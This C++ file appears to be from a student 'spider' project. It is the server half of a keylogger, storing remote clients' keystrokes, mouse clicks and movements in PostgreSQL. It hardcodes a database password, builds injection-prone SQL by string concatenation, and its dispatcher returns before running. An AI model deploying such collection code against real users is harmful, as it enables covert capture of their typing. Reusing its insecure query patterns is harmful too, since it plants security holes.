//
// SqlServer.cpp for sqlServer in /home/debrab_t/rendu/TEK3/cpp_spider/bdd_connect
//
// Made by debrab_t
// Login   <debrab_t@epitech.net>
//
// Started on  Mon Nov  7 10:23:09 2016 debrab_t
// Last update Sun Nov 13 17:48:47 2016 debrab_t
//

/*
  TODO

  - appeler close quand un client ce deconnect du serv
  - reponse des clickmouse, key...
  - reponse sizeof(PackageHeader) + sizeof(PackageAnswer) ?
*/

#include "socket/socketC/serverTcpSocketC.hpp"

SqlServer::SqlServer()
{
  feedPointMap();
  if (dbConnect("dbname=postgres user=postgres password=abcd hostaddr=127.0.0.1 port=5432"))
    {
      _cnt = true;
      createServTab();
      sqlMan.updateData("client", "state = FALSE");
    }
  else
  _cnt = false;
}

SqlServer::~SqlServer()
{

}

bool	SqlServer::dbConnect(std::string const &con)
{
  return (sqlMan.connect(con));
}


void	SqlServer::createServTab()
{
  sqlMan.createTable("CLIENT",
		     "ID  SERIAL PRIMARY KEY,"		\
		     "ID_CLIENT	INT NOT NULL,"		\
		     "PUBLICKEY TEXT NOT NULL,"		\
		     "STATE BOOL NOT NULL");
  sqlMan.createTable("MOUSE_MOUVEMENT",
		     "ID  SERIAL PRIMARY KEY,"		      \
		     "ID_CLIENT INT NOT NULL,"		      \
		     "TIMESTAMP INT NOT NULL,"		      \
		     "X INT NOT NULL,"			      \
		     "Y INT NOT NULL");
  sqlMan.createTable("MOUSE_CLICK",
		     "ID  SERIAL PRIMARY KEY,"		      \
		     "ID_CLIENT INT NOT NULL,"		      \
		     "TIMESTAMP INT NOT NULL,"		      \
		     "X INT NOT NULL,"			      \
		     "Y INT NOT NULL,"			      \
		     "ID_CLICK TEXT NOT NULL");
  sqlMan.createTable("KEYBOARD_STRING",
		     "ID  SERIAL PRIMARY KEY,"	\
		     "ID_CLIENT INT NOT NULL,"	\
		     "TIMESTAMP INT NOT NULL,"	\
		     "ID_KEYBOARD TEXT NOT NULL");
}

bool		SqlServer::isClient(const std::string &id_client)
{
  pqxx::result	reqResult;

  reqResult = sqlMan.selectData("id_client", "client where id_client=" + id_client);
  pqxx::result::const_iterator c = reqResult.begin();
  if (c == reqResult.end())
    return (false);
  return (true);
}

bool		SqlServer::isClientState(const std::string &id_client)
{
  pqxx::result	reqResult;

  reqResult = sqlMan.selectData("state", "client where id_client=" + id_client);
  pqxx::result::const_iterator c = reqResult.begin();
  if (c != reqResult.end() && std::string("t").compare(c[0].as<std::string>()) == 0)
    return (true);
  return (false);
}

bool		SqlServer::connectClient(spider::PacketUnserializer &packet)
{
  PackageCMDIDN	idn;
  PackageHeader	hea;
  std::string	data;
  std::string	id_client;

  idn = packet.getData<PackageCMDIDN>();
  hea = packet.getHeader();
  if (hea.magicNumber != SEND)
    {
      std::cerr << "Try to connect client but magic number is false..." << std::endl;
      return (false);
    }
  id_client = std::to_string(hea.id);
  data = id_client + ", '" + std::string(idn.key) + "', " + "TRUE";
  if (!isClient(id_client))
    {
      sqlMan.insertData("CLIENT",
			"ID_CLIENT, PUBLICKEY, STATE",
			data);
      return (true);
    }
  else if (isClient(id_client) && !isClientState(id_client))
    {
      sqlMan.updateData("CLIENT", "STATE=TRUE WHERE id_client=" + id_client);
      return (true);
    }
  return (false);
}

bool	SqlServer::addMouseMouvement(spider::PacketUnserializer &packet)
{
  PackageCMDMouseMove	mvt;
  PackageHeader		hea;
  std::string		data;
  std::string		id_client;

  mvt = packet.getData<PackageCMDMouseMove>();
  hea = packet.getHeader();
  if (hea.magicNumber != SEND)
    {
      std::cerr << "Try to add mouse mouvement but magic number is false..." << std::endl;
      return (false);
    }
  id_client = std::to_string(hea.id);
  data = id_client +
    ", " + std::to_string(mvt.timestamp) +
    ", " + std::to_string(mvt.x) +
    ", " + std::to_string(mvt.y);
  if (isClient(id_client) && isClientState(id_client))
    {
      HandleFileServer	tst;
      std::map<HandleData::column, std::string> mapTst;

      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::tmeStampMVT, std::to_string(mvt.timestamp)));
      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::xMVT, std::to_string(mvt.x)));
      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::yMVT, std::to_string(mvt.y)));
      tst.insertDataClient(hea.id, mapTst);
      sqlMan.insertData("MOUSE_MOUVEMENT",
			"ID_CLIENT, TIMESTAMP, X, Y",
			data);
      return (true);
    }
  return (false);
}

bool			SqlServer::addMouseClick(spider::PacketUnserializer &packet)
{
  PackageCMDMouseClic	clc;
  PackageHeader		hea;
  std::string		data;
  std::string		id_client;

  clc = packet.getData<PackageCMDMouseClic>();
  hea = packet.getHeader();
  if (hea.magicNumber != SEND)
    {
      std::cerr << "Try to add mouse click but magic number is false..." << std::endl;
      return (false);
    }
  id_client = std::to_string(hea.id);
  data = id_client +
    ", " + std::to_string(clc.timestamp) +
    ", " + std::to_string(clc.x) +
    ", " + std::to_string(clc.y) +
    ", '" + std::string(clc.id) + "'";
  if (isClient(id_client) && isClientState(id_client))
    {
      std::map<HandleData::column, std::string> mapTst;

      sqlMan.insertData("MOUSE_CLICK",
			"ID_CLIENT, TIMESTAMP, X, Y, ID_CLICK",
			data);
      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::tmeStampCLC, std::to_string(clc.timestamp)));
      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::xCLC, std::to_string(clc.x)));
      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::yCLC, std::to_string(clc.y)));
      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::idCLC, std::string(clc.id)));
      dataToFile.insertDataClient(hea.id, mapTst);
      return (true);
    }
  return (false);
}

bool	SqlServer::addKeyboardString(spider::PacketUnserializer &packet)
{
  PackageCMDKeyboardTouch	toc;
  PackageHeader		hea;
  std::string		data;
  std::string		id_client;

  toc = packet.getData<PackageCMDKeyboardTouch>();
  hea = packet.getHeader();
  if (hea.magicNumber != SEND)
    {
      std::cerr << "Try to add keyboard string but magic number is false..." << std::endl;
      return (false);
    }
  id_client = std::to_string(hea.id);
  data = id_client +
    ", " + std::to_string(toc.timestamp) +
    ", '" + strMan.insertStringAfterChar(std::string(toc.id), '\'', "'") + "'";
  if (isClient(id_client) && isClientState(id_client))
    {
      std::map<HandleData::column, std::string> mapTst;
      sqlMan.insertData("KEYBOARD_STRING",
			"ID_CLIENT, TIMESTAMP, ID_KEYBOARD",
			data);
      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::tmeStampTOC, std::to_string(toc.timestamp)));
      mapTst.insert(std::pair<HandleData::column,std::string>(HandleData::column::idTOC, std::string(toc.id)));
      dataToFile.insertDataClient(hea.id, mapTst);
      return (true);
    }
  return (false);
}

bool				SqlServer::response(spider::PacketUnserializer &packet)
{
  PackageAnswer			ans;
  PackageHeader			hea;
  std::string			id_client;

  ans = packet.getData<PackageAnswer>();
  hea = packet.getHeader();
  if (hea.magicNumber != REC)
    {
      std::cerr << "Response of client but magic number is false..." << std::endl;
      return (false);
    }
  std::cout << ans.msg << std::endl;
  return (true);
}

bool				SqlServer::disconnectClient(spider::PacketUnserializer &packet)
{
  PackageCMDLogOut	dec;
  PackageHeader		hea;
  PackageAnswer		ans;
  std::string		id_client;

  dec = packet.getData<PackageCMDLogOut>();
  hea = packet.getHeader();
  id_client = std::to_string(hea.id);
  if (isClient(id_client) && isClientState(id_client))
    {
      sqlMan.updateData("client", "state = FALSE WHERE CLIENT_ID=" + id_client);
      ans.header = hea;
      ans.code = 208;
      std::strncpy(ans.cmd, "DEC", 3);
      std::strncpy(ans.msg, "Deconnection ok\0", std::strlen("Deconnection ok"));
      spider::PacketSerializer<PackageAnswer> respPack(sizeof(PackageHeader) + sizeof(PackageAnswer), hea.id, ans);
      //c.write<PackageAnswer>(respPack);
    }
  return (false);
}

void	SqlServer::feedPointMap()
{
  _pointMap.insert(std::pair<std::string,bddFunc>("idn", &SqlServer::connectClient));
  _pointMap.insert(std::pair<std::string,bddFunc>("clc", &SqlServer::addMouseClick));
  _pointMap.insert(std::pair<std::string,bddFunc>("mvt", &SqlServer::addMouseMouvement));
  _pointMap.insert(std::pair<std::string,bddFunc>("toc", &SqlServer::addKeyboardString));
  _pointMap.insert(std::pair<std::string,bddFunc>("dec",  &SqlServer::disconnectClient));
  _pointMap.insert(std::pair<std::string,bddFunc>("shu",  &SqlServer::response));
  _pointMap.insert(std::pair<std::string,bddFunc>("tal",  &SqlServer::response));
  _pointMap.insert(std::pair<std::string,bddFunc>("pin",  &SqlServer::response));
  _pointMap.insert(std::pair<std::string,bddFunc>("sin",  &SqlServer::response));
  _pointMap.insert(std::pair<std::string,bddFunc>("nor",  &SqlServer::response));
  _pointMap.insert(std::pair<std::string,bddFunc>("mod",  &SqlServer::response));
}

bool		SqlServer::handleData(spider::PacketUnserializer &packet, std::shared_ptr<spider::socket::user> usr)
{
  return (false);
  std::string	stringPacket(packet.getPacketType(), 0, 3);
  bool		ret = false;

  _user = usr;
  strMan.toLowerCase(stringPacket);
  if (!_cnt)
    return (false);
  else if (_pointMap.find(stringPacket) != _pointMap.end())
    ret = ((*this).*_pointMap.find(stringPacket)->second)(packet);
  return (ret ? true : disconnectClient(packet));
}
